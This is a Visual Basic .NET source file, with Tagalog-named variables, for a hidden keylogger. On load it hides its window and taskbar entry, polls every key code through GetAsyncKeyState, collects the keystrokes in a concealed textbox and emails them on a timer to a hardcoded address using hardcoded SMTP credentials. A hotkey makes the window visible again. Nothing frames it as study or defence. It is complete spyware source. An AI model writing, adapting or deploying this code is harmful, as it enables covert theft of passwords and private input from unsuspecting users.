Option Strict On
Imports System.Net.Mail

Public Class Form1

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Private Sub Etime_Tick(sender As Object, e As EventArgs) Handles Etime.Tick
        Try
            Dim mangingisda As New SmtpClient
            mangingisda.EnableSsl = True
            mangingisda.Credentials = New System.Net.NetworkCredential("mangingisdangbolero@google.com", "Malansangfish1$")
            mangingisda.Port = 587
            mangingisda.Host = "smtp.google.com"


            Dim mensahe As New MailMessage
            mensahe.From = New MailAddress("mangingisdangbolero@outlook", "Isda")
            mensahe.To.Add("mangingisdangbolero@google.com")
            mensahe.Subject = (" Pakibasa Please ")
            mensahe.Body = Bitag.Text
            mangingisda.Send(mensahe)



        Catch ex As Exception
            Me.Close()

        End Try
    End Sub

    Private Sub lambat_Tick(sender As Object, e As EventArgs) Handles lambat.Tick
        Dim result As Integer
        Dim i As Integer
        Dim key As String

        'For i = 2 To 90
        For i = 1 To 255
            result = 0
            result = GetAsyncKeyState(i)

            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If

        Next

        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                Bitag.Text &= key
            Else
                Bitag.Text &= key.ToLower
            End If

        End If

        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso
            key = "J" Then Me.Visible = True

    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Bitag.Text &= vbNewLine & " Itigil Na Ito: " & Now & vbNewLine

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load

        ' Na andito ang hiwaga mga pare koy 

        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Visible = False

        Bitag.Text &= vbNewLine & " Nagsimula Na: " & Now & vbNewLine

    End Sub

    Private Sub Bitag_TextChanged(sender As Object, e As EventArgs) Handles Bitag.TextChanged

    End Sub
End Class
